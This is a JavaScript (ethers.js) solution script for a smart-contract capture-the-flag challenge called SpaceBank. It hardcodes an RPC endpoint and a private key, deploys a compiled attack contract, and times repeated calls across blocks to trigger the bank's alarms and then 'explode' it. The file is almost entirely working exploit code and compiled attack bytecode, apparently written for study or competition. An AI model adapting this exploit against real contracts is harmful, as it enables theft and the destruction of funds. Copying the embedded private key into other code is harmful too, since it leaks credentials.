const { ethers, utils, Wallet, Contract, providers, BigNumber } = require('ethers');

async function main() {
    const rpc = new providers.JsonRpcProvider("http://34.147.101.83:8545/SErVJMFERdFPBrfCWGVQaEoc/main");
    const challenge = "0x113048616E4B932ebe907470a7F966353c0C06ad";
    const pvKey = "0xd9d2b58f709b35505b0735f89b18b0b164b9133c1996a03f7bd2c566347cf6a0";
    const wallet = new Wallet(pvKey, rpc);

    // SpaceBank contract interaction
    const spaceBankAbi = [
        "function token() public view returns (address)",
        "function deposit(uint256 amount, bytes calldata data) external",
        "function flashLoan(uint256 amount, address flashLoanReceiver) external",
        "function explodeSpaceBank() external",
        "function exploded() public view returns (bool)"
    ];

    const spaceTokenAbi = [
        "function balanceOf(address account) external view returns (uint256)",
        "function approve(address,uint256)",
        "function mint(address,uint256)"
    ]

    const Attack = {
        abi: [
            "constructor(address _bank, address _token) payable",
            "function attack(uint256) external payable"
        ],
        bytecode: "0x608060405234801561001057600080fd5b5060405161097538038061097583398101604081905261002f9161007c565b600080546001600160a01b039384166001600160a01b031991821617909155600180549290931691161790556100af565b80516001600160a01b038116811461007757600080fd5b919050565b6000806040838503121561008f57600080fd5b61009883610060565b91506100a660208401610060565b90509250929050565b6108b7806100be6000396000f3fe60806040526004361061004a5760003560e01c806364dd891a1461004f57806376cdb03b14610064578063d5e5850c146100a0578063fb056f68146100c0578063fc0c546a146100e0575b600080fd5b61006261005d366004610637565b610100565b005b34801561007057600080fd5b50600054610084906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100ac57600080fd5b506100846100bb366004610682565b6101d3565b3480156100cc57600080fd5b506100626100db366004610637565b61022f565b3480156100ec57600080fd5b50600154610084906001600160a01b031681565b80600314806101105750806103e7145b61011957600080fd5b80600303610198576103e834101561013057600080fd5b600054604051630499cfd760e41b8152600360048201523060248201526001600160a01b039091169063499cfd70906044015b600060405180830381600087803b15801561017d57600080fd5b505af1158015610191573d6000803e3d6000fd5b5050505050565b600054604051630499cfd760e41b81526103e760048201523060248201526001600160a01b039091169063499cfd7090604401610163565b50565b8151602092830120604080516001600160f81b03198186015260609390931b6bffffffffffffffffffffffff19166021840152436035840152605580840192909252805180840390920182526075909201909152805191012090565b806003036104de576000610244602f43610744565b60015460005460405163095ea7b360e01b81526001600160a01b0391821660048201526000196024820152929350169063095ea7b3906044016020604051808303816000875af115801561029c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102c09190610766565b506000546040805160208082018590528251808303909101815281830192839052635d30351960e01b9092526001600160a01b0390921691635d3035199161030e91600191906044016107b3565b600060405180830381600087803b15801561032857600080fd5b505af115801561033c573d6000803e3d6000fd5b505050506000604051806020016103529061062b565b601f1982820381018352601f9091011660408181526000546001600160a01b031660208301520160408051601f198184030181529082905261039792916020016107ed565b60408051601f1981840301815291905260008054919250906103c39083906001600160a01b03166101d3565b6040519091506001600160a01b038216906000906103e89082818181858883f193505050501580156103f9573d6000803e3d6000fd5b50600054604051635d30351960e01b81526001600160a01b0390911690635d3035199061042d9060019086906004016107b3565b600060405180830381600087803b15801561044757600080fd5b505af115801561045b573d6000803e3d6000fd5b50506001805460005460405163a9059cbb60e01b81526001600160a01b039182166004820152602481019390935216925063a9059cbb91506044016020604051808303816000875af11580156104b5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104d99190610766565b505050505b806103e70361054c57600054604051630499cfd760e41b8152600160048201523060248201526001600160a01b039091169063499cfd7090604401600060405180830381600087803b15801561053357600080fd5b505af1158015610547573d6000803e3d6000fd5b505050505b806001036101d05760008054604080516360388ef360e11b815290516001600160a01b039092169263c0711de69260048084019382900301818387803b15801561059557600080fd5b505af11580156105a9573d6000803e3d6000fd5b505060015460005460405163a9059cbb60e01b81526001600160a01b0391821660048201526103e860248201529116925063a9059cbb91506044016020604051808303816000875af1158015610603573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106279190610766565b5050565b60658061081d83390190565b60006020828403121561064957600080fd5b5035919050565b634e487b7160e01b600052604160045260246000fd5b80356001600160a01b038116811461067d57600080fd5b919050565b6000806040838503121561069557600080fd5b823567ffffffffffffffff808211156106ad57600080fd5b818501915085601f8301126106c157600080fd5b8135818111156106d3576106d3610650565b604051601f8201601f19908116603f011681019083821181831017156106fb576106fb610650565b8160405282815288602084870101111561071457600080fd5b82602086016020830137600060208483010152809650505050505061073b60208401610666565b90509250929050565b60008261076157634e487b7160e01b600052601260045260246000fd5b500690565b60006020828403121561077857600080fd5b8151801515811461078857600080fd5b9392505050565b60005b838110156107aa578181015183820152602001610792565b50506000910152565b82815260406020820152600082518060408401526107d881606085016020870161078f565b601f01601f1916919091016060019392505050565b600083516107ff81846020880161078f565b83519083019061081381836020880161078f565b0194935050505056fe6080604052348015600f57600080fd5b5060405160653803806065833981016040819052602a916036565b806001600160a01b0316ff5b600060208284031215604757600080fd5b81516001600160a01b0381168114605d57600080fd5b939250505056fea26469706673582212209303f6f46edd05b3d4caac3087083ce885415346df5267bc7cf6c73a794afc3c64736f6c63430008150033"
    };

    const challengeAbi = [
        "function isSolved() external view returns (bool)",
        "function SPACEBANK() external view returns (address)"
    ];

    console.log("Balance:", await wallet.getBalance());

    const contract = new Contract(challenge, challengeAbi, wallet);
    const spaceBank = await contract.SPACEBANK();
    console.log("SpaceBank:", spaceBank);

    const bankContract = new Contract(spaceBank, spaceBankAbi, wallet);

    // Get the SpaceToken address
    const tknAddress = await bankContract.token();
    console.log("SpaceToken:", tknAddress);

    const tknContract = new Contract(tknAddress, spaceTokenAbi, wallet);

    // Deploy the Attack contract
    const attackFactory = new ethers.ContractFactory(
        Attack.abi,
        Attack.bytecode,
        wallet
    );
    const attackContract = await attackFactory.deploy(spaceBank, tknAddress);
    await attackContract.deployed();
    console.log("Attack contract deployed at:", attackContract.address);

    // Get the current block number
    const currentBlockNumber = await rpc.getBlockNumber();
    console.log("PING1", currentBlockNumber);

    // Trigger the alarms
    const attack1Tx = await attackContract.attack(3, { value: 1000 });
    const attack1TxReceipt = await attack1Tx.wait();
    const attack1BlockNumber = attack1TxReceipt.blockNumber;
    console.log("Alarms triggered at block", attack1BlockNumber);

    const startBlock = attack1BlockNumber;
    const endBlock = startBlock + 5;

    // Wait for the start block
    while (true) {
        const currentBlockNumber = await rpc.getBlockNumber();
        if (currentBlockNumber >= startBlock) {
            break;
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Attempt the attack within the defined block range
    let attackExecuted = false;
    let lastAttemptedBlock = 0;
    while (!attackExecuted && (await rpc.getBlockNumber()) <= endBlock) {
        const currentBlockNumber = await rpc.getBlockNumber();
        if (currentBlockNumber > lastAttemptedBlock) {
            try {
                const attack2Tx = await attackContract.attack(999, { value: 0 });
                await attack2Tx.wait();
                console.log("Bank Exploded");
                attackExecuted = true;
            } catch (error) {
                console.log("Attack failed, retrying in the next block... Current Block:", currentBlockNumber);
            }
            lastAttemptedBlock = currentBlockNumber;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); // Reduced delay to 50ms
    }

    if (!attackExecuted) {
        console.log("Failed to execute the attack within the specified block range.");
    }


    if (!attackExecuted) {
        console.log("Failed to execute the attack within the specified block range.");
    }


    // Check if the challenge is solved
    const isSolved = await contract.isSolved();
    console.log("Challenge solved:", isSolved);
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});